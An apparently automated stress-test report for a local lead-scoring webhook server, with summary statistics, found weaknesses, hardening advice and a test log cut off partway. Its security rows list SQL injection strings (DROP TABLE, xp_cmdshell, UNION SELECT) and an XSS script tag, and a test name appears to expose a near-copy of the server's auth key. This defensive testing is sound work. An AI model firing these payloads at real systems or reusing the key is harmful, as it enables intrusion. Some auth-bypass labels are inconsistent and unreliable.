# RB2B/Leadpipe Webhook Server - Stress Test Report

**Generated:** 2026-02-04T01:40:09.120Z  
**Target:** http://localhost:9100/rb2b/webhook  
**Server:** /home/ec2-user/clawd/services/rb2b-webhook/server.js  

---

## 📊 Summary Statistics

| Metric | Count |
|--------|-------|
| **Total Tests** | 761 |
| **Passed** | 754 ✅ |
| **Failed** | 7 ❌ |
| **Pass Rate** | 99.1% |

### By Category

| Category | Total | Passed | Failed | Pass Rate |
|----------|-------|--------|--------|-----------|
| Functional | 280 | 280 | 0 | 100.0% |
| Security | 279 | 275 | 4 | 98.6% |
| Load | 113 | 113 | 0 | 100.0% |
| EdgeCase | 89 | 86 | 3 | 96.6% |

---

## 🔴 Security Vulnerabilities Found

### Low: Stored XSS (Low Risk)
- **Detail:** XSS payload stored in log file via First Name: <script>alert("XSS")</script>
- **Note:** Log files are JSONL - XSS would only trigger if logs are rendered as HTML

### High: No Payload Size Limit
- **Detail:** 1MB payload accepted without rejection - potential DoS


### Low: No Content-Type Validation
- **Detail:** Server accepts any Content-Type header without validation


### Medium: No Rate Limiting on Auth
- **Detail:** No rate limiting on failed auth attempts - brute force possible



---

## 💥 Crash Scenarios

No crashes detected during testing.

---

## ⚠️ Unexpected Behaviors

- **Test #481** (Key with space): Auth bypass: expected 200, got 0
- **Test #486** (Multiple keys): Auth bypass: expected 401, got 200
- **Test #509** (Brute force: "T5v9hc5rP64wwhNE0FKs"): Auth bypass: expected 200, got 401
- **Test #510** (Brute force: " T5v9hc5rP64wwhNE0FK"): Auth bypass: expected 200, got 401

---

## 🛡️ Recommendations for Hardening

### Critical Priority

1. **Add Request Body Size Limit**
   - Currently accepts payloads of any size (tested up to 5MB)
   - Add `req.on('data')` size tracking and abort if > 1MB
   - Example: Track `bodySize += chunk.length` and destroy request if exceeded
   
2. **Add Rate Limiting**
   - No rate limiting exists — brute force auth attempts unlimited
   - Track requests per IP per minute using a simple Map
   - Recommend: 60 requests/min per IP, 10 failed auth/min per IP
   
3. **Add Input Type Validation**
   - `scoreVisitor()` calls `.toLowerCase()` on fields without checking if they're strings
   - Will crash on number/boolean/array/object inputs: `(42).toLowerCase()` throws TypeError
   - Add: `const title = String(data['Title'] || '').toLowerCase()`

### High Priority

4. **Validate Content-Type Header**
   - Accept only `application/json`
   - Return 415 Unsupported Media Type for others

5. **Sanitize Log Outputs**
   - XSS/injection payloads stored directly in log files
   - If logs are ever viewed in a web UI, stored XSS is possible
   - Sanitize or encode special characters before logging

6. **Add Request Timeout**
   - Server has no request timeout — slow clients could hold connections
   - Add `server.timeout = 30000` or use `req.setTimeout()`

### Medium Priority

7. **Add Deduplication**
   - Same visitor logged multiple times per session without dedup
   - Track by email or name+company hash with TTL

8. **Validate URL Fields**
   - LinkedIn URL and Captured URL accept any string including SSRF-like values
   - While not currently exploitable, validate URL format

9. **Add CORS Headers**
   - No CORS configuration — add restrictive headers

10. **Use Async File Operations**
    - `appendFileSync` blocks the event loop
    - Switch to `fs.promises.appendFile` for better concurrency

### Low Priority

11. **Add Structured Logging**
    - Current console.log is unstructured
    - Use winston/pino for proper log levels and rotation

12. **Add Health Check Detail**
    - Include uptime, memory usage, request count in /health

13. **Environment Variable Validation**
    - Validate required env vars on startup
    - Warn if SLACK_WEBHOOK_URL is not set

---

## 📋 Full Test Log

<details>
<summary>Click to expand full test log (761 tests)</summary>

| # | Category | Test | Expected | Actual | Result | Notes |
|---|----------|------|----------|--------|--------|-------|
| 1 | Functional | Full valid payload - attorney | status 200 | status 200 | ✅ |  |
| 2 | Functional | Full valid - CEO | status 200 | status 200 | ✅ |  |
| 3 | Functional | Full valid - Partner | status 200 | status 200 | ✅ |  |
| 4 | Functional | Full valid - Owner | status 200 | status 200 | ✅ |  |
| 5 | Functional | Full valid - VP | status 200 | status 200 | ✅ |  |
| 6 | Functional | Only name fields | status 200 | status 200 | ✅ |  |
| 7 | Functional | Name + Title only | status 200 | status 200 | ✅ |  |
| 8 | Functional | All fields populated | status 200 | status 200 | ✅ |  |
| 9 | Functional | Gmail email (non-business) | status 200 | status 200 | ✅ |  |
| 10 | Functional | Yahoo email | status 200 | status 200 | ✅ |  |
| 11 | Functional | Hotmail email | status 200 | status 200 | ✅ |  |
| 12 | Functional | High-intent pricing page | status 200 | status 200 | ✅ |  |
| 13 | Functional | High-intent contact page | status 200 | status 200 | ✅ |  |
| 14 | Functional | High-intent demo page | status 200 | status 200 | ✅ |  |
| 15 | Functional | High-intent start page | status 200 | status 200 | ✅ |  |
| 16 | Functional | Blog page (low intent) | status 200 | status 200 | ✅ |  |
| 17 | Functional | Homepage only | status 200 | status 200 | ✅ |  |
| 18 | Functional | No LinkedIn | status 200 | status 200 | ✅ |  |
| 19 | Functional | No LinkedIn (null) | status 200 | status 200 | ✅ |  |
| 20 | Functional | Employee 11-50 | status 200 | status 200 | ✅ |  |
| 21 | Functional | Employee 51-200 | status 200 | status 200 | ✅ |  |
| 22 | Functional | Employee 201-500 | status 200 | status 200 | ✅ |  |
| 23 | Functional | Employee 1-10 | status 200 | status 200 | ✅ |  |
| 24 | Functional | Employee 500+ | status 200 | status 200 | ✅ |  |
| 25 | Functional | Direct referrer | status 200 | status 200 | ✅ |  |
| 26 | Functional | Google referrer | status 200 | status 200 | ✅ |  |
| 27 | Functional | Facebook referrer | status 200 | status 200 | ✅ |  |
| 28 | Functional | Insurance industry | status 200 | status 200 | ✅ |  |
| 29 | Functional | Personal injury | status 200 | status 200 | ✅ |  |
| 30 | Functional | Non-legal industry | status 200 | status 200 | ✅ |  |
| 31 | Functional | Litigation industry | status 200 | status 200 | ✅ |  |
| 32 | Functional | Trial attorney | status 200 | status 200 | ✅ |  |
| 33 | Functional | Paralegal | status 200 | status 200 | ✅ |  |
| 34 | Functional | Of counsel | status 200 | status 200 | ✅ |  |
| 35 | Functional | Director of operations | status 200 | status 200 | ✅ |  |
| 36 | Functional | Head of marketing | status 200 | status 200 | ✅ |  |
| 37 | Functional | Chief legal officer | status 200 | status 200 | ✅ |  |
| 38 | Functional | Combo variant #38 | status 200 | status 200 | ✅ |  |
| 39 | Functional | Combo variant #39 | status 200 | status 200 | ✅ |  |
| 40 | Functional | Combo variant #40 | status 200 | status 200 | ✅ |  |
| 41 | Functional | Combo variant #41 | status 200 | status 200 | ✅ |  |
| 42 | Functional | Combo variant #42 | status 200 | status 200 | ✅ |  |
| 43 | Functional | Combo variant #43 | status 200 | status 200 | ✅ |  |
| 44 | Functional | Combo variant #44 | status 200 | status 200 | ✅ |  |
| 45 | Functional | Combo variant #45 | status 200 | status 200 | ✅ |  |
| 46 | Functional | Combo variant #46 | status 200 | status 200 | ✅ |  |
| 47 | Functional | Combo variant #47 | status 200 | status 200 | ✅ |  |
| 48 | Functional | Combo variant #48 | status 200 | status 200 | ✅ |  |
| 49 | Functional | Combo variant #49 | status 200 | status 200 | ✅ |  |
| 50 | Functional | Combo variant #50 | status 200 | status 200 | ✅ |  |
| 51 | Functional | Combo variant #51 | status 200 | status 200 | ✅ |  |
| 52 | Functional | Combo variant #52 | status 200 | status 200 | ✅ |  |
| 53 | Functional | Combo variant #53 | status 200 | status 200 | ✅ |  |
| 54 | Functional | Combo variant #54 | status 200 | status 200 | ✅ |  |
| 55 | Functional | Combo variant #55 | status 200 | status 200 | ✅ |  |
| 56 | Functional | Combo variant #56 | status 200 | status 200 | ✅ |  |
| 57 | Functional | Combo variant #57 | status 200 | status 200 | ✅ |  |
| 58 | Functional | Combo variant #58 | status 200 | status 200 | ✅ |  |
| 59 | Functional | Combo variant #59 | status 200 | status 200 | ✅ |  |
| 60 | Functional | Combo variant #60 | status 200 | status 200 | ✅ |  |
| 61 | Functional | Combo variant #61 | status 200 | status 200 | ✅ |  |
| 62 | Functional | Combo variant #62 | status 200 | status 200 | ✅ |  |
| 63 | Functional | Combo variant #63 | status 200 | status 200 | ✅ |  |
| 64 | Functional | Combo variant #64 | status 200 | status 200 | ✅ |  |
| 65 | Functional | Combo variant #65 | status 200 | status 200 | ✅ |  |
| 66 | Functional | Combo variant #66 | status 200 | status 200 | ✅ |  |
| 67 | Functional | Combo variant #67 | status 200 | status 200 | ✅ |  |
| 68 | Functional | Combo variant #68 | status 200 | status 200 | ✅ |  |
| 69 | Functional | Combo variant #69 | status 200 | status 200 | ✅ |  |
| 70 | Functional | Combo variant #70 | status 200 | status 200 | ✅ |  |
| 71 | Functional | Combo variant #71 | status 200 | status 200 | ✅ |  |
| 72 | Functional | Combo variant #72 | status 200 | status 200 | ✅ |  |
| 73 | Functional | Combo variant #73 | status 200 | status 200 | ✅ |  |
| 74 | Functional | Combo variant #74 | status 200 | status 200 | ✅ |  |
| 75 | Functional | Combo variant #75 | status 200 | status 200 | ✅ |  |
| 76 | Functional | Combo variant #76 | status 200 | status 200 | ✅ |  |
| 77 | Functional | Combo variant #77 | status 200 | status 200 | ✅ |  |
| 78 | Functional | Combo variant #78 | status 200 | status 200 | ✅ |  |
| 79 | Functional | Combo variant #79 | status 200 | status 200 | ✅ |  |
| 80 | Functional | Combo variant #80 | status 200 | status 200 | ✅ |  |
| 81 | Functional | Combo variant #81 | status 200 | status 200 | ✅ |  |
| 82 | Functional | Combo variant #82 | status 200 | status 200 | ✅ |  |
| 83 | Functional | Combo variant #83 | status 200 | status 200 | ✅ |  |
| 84 | Functional | Combo variant #84 | status 200 | status 200 | ✅ |  |
| 85 | Functional | Combo variant #85 | status 200 | status 200 | ✅ |  |
| 86 | Functional | Combo variant #86 | status 200 | status 200 | ✅ |  |
| 87 | Functional | Combo variant #87 | status 200 | status 200 | ✅ |  |
| 88 | Functional | Combo variant #88 | status 200 | status 200 | ✅ |  |
| 89 | Functional | Combo variant #89 | status 200 | status 200 | ✅ |  |
| 90 | Functional | Combo variant #90 | status 200 | status 200 | ✅ |  |
| 91 | Functional | Combo variant #91 | status 200 | status 200 | ✅ |  |
| 92 | Functional | Combo variant #92 | status 200 | status 200 | ✅ |  |
| 93 | Functional | Combo variant #93 | status 200 | status 200 | ✅ |  |
| 94 | Functional | Combo variant #94 | status 200 | status 200 | ✅ |  |
| 95 | Functional | Combo variant #95 | status 200 | status 200 | ✅ |  |
| 96 | Functional | Combo variant #96 | status 200 | status 200 | ✅ |  |
| 97 | Functional | Combo variant #97 | status 200 | status 200 | ✅ |  |
| 98 | Functional | Combo variant #98 | status 200 | status 200 | ✅ |  |
| 99 | Functional | Combo variant #99 | status 200 | status 200 | ✅ |  |
| 100 | Functional | Combo variant #100 | status 200 | status 200 | ✅ |  |
| 101 | Functional | Missing field: First Name | status 200 (graceful) | status 200 | ✅ |  |
| 102 | Functional | Missing field: Last Name | status 200 (graceful) | status 200 | ✅ |  |
| 103 | Functional | Missing field: Title | status 200 (graceful) | status 200 | ✅ |  |
| 104 | Functional | Missing field: Company Name | status 200 (graceful) | status 200 | ✅ |  |
| 105 | Functional | Missing field: Industry | status 200 (graceful) | status 200 | ✅ |  |
| 106 | Functional | Missing field: Business Email | status 200 (graceful) | status 200 | ✅ |  |
| 107 | Functional | Missing field: Captured URL | status 200 (graceful) | status 200 | ✅ |  |
| 108 | Functional | Missing field: City | status 200 (graceful) | status 200 | ✅ |  |
| 109 | Functional | Missing field: State | status 200 (graceful) | status 200 | ✅ |  |
| 110 | Functional | Missing 1 fields | status 200 (graceful) | status 200 | ✅ |  |
| 111 | Functional | Missing 2 fields | status 200 (graceful) | status 200 | ✅ |  |
| 112 | Functional | Missing 3 fields | status 200 (graceful) | status 200 | ✅ |  |
| 113 | Functional | Missing 4 fields | status 200 (graceful) | status 200 | ✅ |  |
| 114 | Functional | Missing 5 fields | status 200 (graceful) | status 200 | ✅ |  |
| 115 | Functional | Missing 6 fields | status 200 (graceful) | status 200 | ✅ |  |
| 116 | Functional | Missing 7 fields | status 200 (graceful) | status 200 | ✅ |  |
| 117 | Functional | Missing 8 fields | status 200 (graceful) | status 200 | ✅ |  |
| 118 | Functional | Missing 9 fields | status 200 (graceful) | status 200 | ✅ |  |
| 119 | Functional | Missing 10 fields | status 200 (graceful) | status 200 | ✅ |  |
| 120 | Functional | Empty object #1 | status 200 | status 200 | ✅ |  |
| 121 | Functional | Empty object #2 | status 200 | status 200 | ✅ |  |
| 122 | Functional | Empty object #3 | status 200 | status 200 | ✅ |  |
| 123 | Functional | Empty object #4 | status 200 | status 200 | ✅ |  |
| 124 | Functional | Empty object #5 | status 200 | status 200 | ✅ |  |
| 125 | Functional | Null body string | status 200 (parse_error) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 126 | Functional | Empty string body | status 200 (parse_error) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 127 | Functional | Undefined string | status 200 (parse_error) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 128 | Functional | Just whitespace | status 200 (parse_error) | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 129 | Functional | Array instead of object | status 200 (parse_error) | status 200, body: {"received":true,"score":0,"qual | ✅ |  |
| 130 | Functional | Array with object | status 200 (parse_error) | status 200, body: {"received":true,"score":0,"qual | ✅ |  |
| 131 | Functional | Number body | status 200 (parse_error) | status 200, body: {"received":true,"score":0,"qual | ✅ |  |
| 132 | Functional | Boolean body | status 200 (parse_error) | status 200, body: {"received":true,"score":0,"qual | ✅ |  |
| 133 | Functional | False body | status 200 (parse_error) | status 200, body: {"received":true,"score":0,"qual | ✅ |  |
| 134 | Functional | Zero body | status 200 (parse_error) | status 200, body: {"received":true,"score":0,"qual | ✅ |  |
| 135 | Functional | Null value: First Name | status 200 | status 200 | ✅ |  |
| 136 | Functional | Null value: Last Name | status 200 | status 200 | ✅ |  |
| 137 | Functional | Null value: Title | status 200 | status 200 | ✅ |  |
| 138 | Functional | Null value: Company Name | status 200 | status 200 | ✅ |  |
| 139 | Functional | Null value: Industry | status 200 | status 200 | ✅ |  |
| 140 | Functional | Null value: Business Email | status 200 | status 200 | ✅ |  |
| 141 | Functional | Null value: Captured URL | status 200 | status 200 | ✅ |  |
| 142 | Functional | Null value: City | status 200 | status 200 | ✅ |  |
| 143 | Functional | Null value: State | status 200 | status 200 | ✅ |  |
| 144 | Functional | Title = 0 | status 200 | status 200 | ✅ |  |
| 145 | Functional | Title = false | status 200 | status 200 | ✅ |  |
| 146 | Functional | Title = NaN | status 200 | status 200 | ✅ |  |
| 147 | Functional | Company Name = 0 | status 200 | status 200 | ✅ |  |
| 148 | Functional | Company Name = false | status 200 | status 200 | ✅ |  |
| 149 | Functional | Company Name = NaN | status 200 | status 200 | ✅ |  |
| 150 | Functional | Industry = 0 | status 200 | status 200 | ✅ |  |
| 151 | Functional | Industry = false | status 200 | status 200 | ✅ |  |
| 152 | Functional | Industry = NaN | status 200 | status 200 | ✅ |  |
| 153 | Functional | 10K chars in First Name | status 200 | status 200, 2ms | ✅ |  |
| 154 | Functional | 10K chars in Last Name | status 200 | status 200, 2ms | ✅ |  |
| 155 | Functional | 10K chars in Title | status 200 | status 200, 2ms | ✅ |  |
| 156 | Functional | 10K chars in Company Name | status 200 | status 200, 2ms | ✅ |  |
| 157 | Functional | 10K chars in Industry | status 200 | status 200, 1ms | ✅ |  |
| 158 | Functional | 10K chars in Business Email | status 200 | status 200, 2ms | ✅ |  |
| 159 | Functional | 10K chars in LinkedIn URL | status 200 | status 200, 1ms | ✅ |  |
| 160 | Functional | 10K chars in Captured URL | status 200 | status 200, 3ms | ✅ |  |
| 161 | Functional | 10K chars in City | status 200 | status 200, 1ms | ✅ |  |
| 162 | Functional | 10K chars in State | status 200 | status 200, 1ms | ✅ |  |
| 163 | Functional | 100K chars in First Name | status 200 | status 200, 7ms | ✅ |  |
| 164 | Functional | 100K chars in Title | status 200 | status 200, 4ms | ✅ |  |
| 165 | Functional | 100K chars in Company Name | status 200 | status 200, 5ms | ✅ |  |
| 166 | Functional | 100K chars in Industry | status 200 | status 200, 4ms | ✅ |  |
| 167 | Functional | 100K chars in Captured URL | status 200 | status 200, 3ms | ✅ |  |
| 168 | Functional | 1MB chars in Title | status 200 (should reject?) | status 200, 57ms | ✅ |  |
| 169 | Functional | 1MB chars in First Name | status 200 (should reject?) | status 200, 39ms | ✅ |  |
| 170 | Functional | 1MB chars in Captured URL | status 200 (should reject?) | status 200, 37ms | ✅ |  |
| 171 | Functional | Chinese name | status 200 | status 200 | ✅ |  |
| 172 | Functional | Japanese name | status 200 | status 200 | ✅ |  |
| 173 | Functional | Korean name | status 200 | status 200 | ✅ |  |
| 174 | Functional | Arabic name | status 200 | status 200 | ✅ |  |
| 175 | Functional | Hindi name | status 200 | status 200 | ✅ |  |
| 176 | Functional | Emoji name | status 200 | status 200 | ✅ |  |
| 177 | Functional | Emoji in title | status 200 | status 200 | ✅ |  |
| 178 | Functional | Emoji in company | status 200 | status 200 | ✅ |  |
| 179 | Functional | Special chars in name | status 200 | status 200 | ✅ |  |
| 180 | Functional | Accented chars | status 200 | status 200 | ✅ |  |
| 181 | Functional | German umlauts | status 200 | status 200 | ✅ |  |
| 182 | Functional | French accents | status 200 | status 200 | ✅ |  |
| 183 | Functional | Null bytes in name | status 200 | status 200 | ✅ |  |
| 184 | Functional | Tab/newline in name | status 200 | status 200 | ✅ |  |
| 185 | Functional | Backslash in name | status 200 | status 200 | ✅ |  |
| 186 | Functional | Quote in name | status 200 | status 200 | ✅ |  |
| 187 | Functional | Zero-width chars | status 200 | status 200 | ✅ |  |
| 188 | Functional | RTL override | status 200 | status 200 | ✅ |  |
| 189 | Functional | Combining chars | status 200 | status 200 | ✅ |  |
| 190 | Functional | Surrogate pairs | status 200 | status 200 | ✅ |  |
| 191 | Functional | Mixed scripts | status 200 | status 200 | ✅ |  |
| 192 | Functional | Zalgo text | status 200 | status 200 | ✅ |  |
| 193 | Functional | All emoji title | status 200 | status 200 | ✅ |  |
| 194 | Functional | URL in name | status 200 | status 200 | ✅ |  |
| 195 | Functional | HTML in name | status 200 | status 200 | ✅ |  |
| 196 | Functional | Very long unicode | status 200 | status 200 | ✅ |  |
| 197 | Functional | Newlines everywhere | status 200 | status 200 | ✅ |  |
| 198 | Functional | Control characters | status 200 | status 200 | ✅ |  |
| 199 | Functional | Unicode escapes | status 200 | status 200 | ✅ |  |
| 200 | Functional | Emoji flag sequence | status 200 | status 200 | ✅ |  |
| 201 | Functional | Duplicate submission #1 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 202 | Functional | Duplicate submission #2 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 203 | Functional | Duplicate submission #3 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 204 | Functional | Duplicate submission #4 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 205 | Functional | Duplicate submission #5 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 206 | Functional | Duplicate submission #6 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 207 | Functional | Duplicate submission #7 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 208 | Functional | Duplicate submission #8 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 209 | Functional | Duplicate submission #9 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 210 | Functional | Duplicate submission #10 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 211 | Functional | Duplicate submission #11 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 212 | Functional | Duplicate submission #12 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 213 | Functional | Duplicate submission #13 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 214 | Functional | Duplicate submission #14 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 215 | Functional | Duplicate submission #15 | status 200 (no dedup) | status 200 | ✅ | Server has no deduplication - each submission logged separately |
| 216 | Functional | Same person, page: /pricing | status 200 | status 200 | ✅ |  |
| 217 | Functional | Same person, page: /about | status 200 | status 200 | ✅ |  |
| 218 | Functional | Same person, page: /contact | status 200 | status 200 | ✅ |  |
| 219 | Functional | Same person, page: /blog | status 200 | status 200 | ✅ |  |
| 220 | Functional | Same person, page: /services | status 200 | status 200 | ✅ |  |
| 221 | Functional | Same person, page: /demo | status 200 | status 200 | ✅ |  |
| 222 | Functional | Same person, page: /team | status 200 | status 200 | ✅ |  |
| 223 | Functional | Same person, page: /careers | status 200 | status 200 | ✅ |  |
| 224 | Functional | Same person, page: /faq | status 200 | status 200 | ✅ |  |
| 225 | Functional | Same person, page: /resources | status 200 | status 200 | ✅ |  |
| 226 | Functional | Same person, page: /case-studies | status 200 | status 200 | ✅ |  |
| 227 | Functional | Same person, page: /testimonials | status 200 | status 200 | ✅ |  |
| 228 | Functional | Same person, page: /partners | status 200 | status 200 | ✅ |  |
| 229 | Functional | Same person, page: /support | status 200 | status 200 | ✅ |  |
| 230 | Functional | Same person, page: /home | status 200 | status 200 | ✅ |  |
| 231 | Functional | Score exactly 40 (title match + business email) | status 200 with score | status 200, score: 65, qualified: true | ✅ | Score: 65 |
| 232 | Functional | Score 35 (title match + LinkedIn) | status 200 with score | status 200, score: 60, qualified: true | ✅ | Score: 60 |
| 233 | Functional | Score 30 (title only) | status 200 with score | status 200, score: 55, qualified: true | ✅ | Score: 55 |
| 234 | Functional | Score 0 (no matches) | status 200 with score | status 200, score: 0, qualified: false | ✅ | Score: 0 |
| 235 | Functional | Score negative (excluded student) | status 200 with score | status 200, score: 20, qualified: false | ✅ | Score: 20 |
| 236 | Functional | Max score (all bonuses) | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 237 | Functional | Excluded + legal industry | status 200 with score | status 200, score: 50, qualified: true | ✅ | Score: 50 |
| 238 | Functional | Student in legal | status 200 with score | status 200, score: 20, qualified: false | ✅ | Score: 20 |
| 239 | Functional | Intern at law firm | status 200 with score | status 200, score: 20, qualified: false | ✅ | Score: 20 |
| 240 | Functional | Title AND excluded (both match) | status 200 with score | status 200, score: 50, qualified: true | ✅ | Score: 50 |
| 241 | Functional | Score test - Title: "Manager" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 242 | Functional | Score test - Title: "Analyst" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 243 | Functional | Score test - Title: "Secretary" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 244 | Functional | Score test - Title: "Clerk" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 245 | Functional | Score test - Title: "Nurse" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 246 | Functional | Score test - Title: "Doctor" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 247 | Functional | Score test - Title: "Teacher" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 248 | Functional | Score test - Title: "Engineer" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 249 | Functional | Score test - Title: "Consultant" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 250 | Functional | Score test - Title: "Advisor" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 251 | Functional | Score test - Title: "Accountant" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 252 | Functional | Score test - Title: "Janitor" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 253 | Functional | Score test - Title: "Driver" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 254 | Functional | Score test - Title: "Cook" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 255 | Functional | Score test - Title: "Artist" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 256 | Functional | Score test - Title: "Attorney at Law" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 257 | Functional | Score test - Title: "Senior Counsel" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 258 | Functional | Score test - Title: "Associate Attorney" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 259 | Functional | Score test - Title: "Legal Assistant" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 260 | Functional | Score test - Title: "Partner (Retired)" | status 200 with score | status 200, score: 50, qualified: true | ✅ | Score: 50 |
| 261 | Functional | Score test - Title: "Junior Partner" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 262 | Functional | Score test - Title: "Head of Legal" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 263 | Functional | Score test - Title: "Chief Counsel" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 264 | Functional | Score test - Title: "VP Legal Affairs" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 265 | Functional | Score test - Title: "Director of Legal" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 266 | Functional | Score test - Title: "Owner" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 267 | Functional | Score test - Title: "President" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 268 | Functional | Score test - Title: "Founding Partner" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 269 | Functional | Score test - Title: "Managing Partner Emeritus" | status 200 with score | status 200, score: 100, qualified: true | ✅ | Score: 100 |
| 270 | Functional | Score test - Title: "Legal Intern" | status 200 with score | status 200, score: 50, qualified: true | ✅ | Score: 50 |
| 271 | Functional | Score test - Title: "" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 272 | Functional | Score test - Title: " " | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 273 | Functional | Score test - Title: "N/A" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 274 | Functional | Score test - Title: "Unknown" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 275 | Functional | Score test - Title: "Other" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 276 | Functional | Score test - Title: "Self-Employed" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 277 | Functional | Score test - Title: "Freelance" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 278 | Functional | Score test - Title: "Contract" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 279 | Functional | Score test - Title: "Temp" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 280 | Functional | Score test - Title: "Volunteer" | status 200 with score | status 200, score: 70, qualified: true | ✅ | Score: 70 |
| 281 | Security | SQLi in First Name: ' OR '1'='1 | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 282 | Security | SQLi in Last Name: '; DROP TABLE visitors;-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 283 | Security | SQLi in Title: 1; DELETE FROM users WHERE 1=1 | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 284 | Security | SQLi in Company Name: ' UNION SELECT * FROM users- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 285 | Security | SQLi in Industry: admin'-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 286 | Security | SQLi in Business Email: ' OR 1=1-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 287 | Security | SQLi in City: '; INSERT INTO users VALUES('h | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 288 | Security | SQLi in State: 1' ORDER BY 1--+ | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 289 | Security | SQLi in Captured URL: 1' UNION SELECT null,null,nu | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 290 | Security | SQLi in Referrer: ' AND '1'='1 | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 291 | Security | SQLi in First Name: " OR ""=" | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 292 | Security | SQLi in Last Name: ' OR ''=' | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 293 | Security | SQLi in Title: '; EXEC xp_cmdshell('whoami'); | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 294 | Security | SQLi in Company Name: 1; WAITFOR DELAY '0:0:5'-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 295 | Security | SQLi in Industry: '; SHUTDOWN;-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 296 | Security | SQLi in Business Email: 1' AND SLEEP(5)-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 297 | Security | SQLi in City: 1' AND (SELECT * FROM (SELECT( | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 298 | Security | SQLi in State: ' HAVING 1=1-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 299 | Security | SQLi in Captured URL: ' GROUP BY columnname HAVING | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
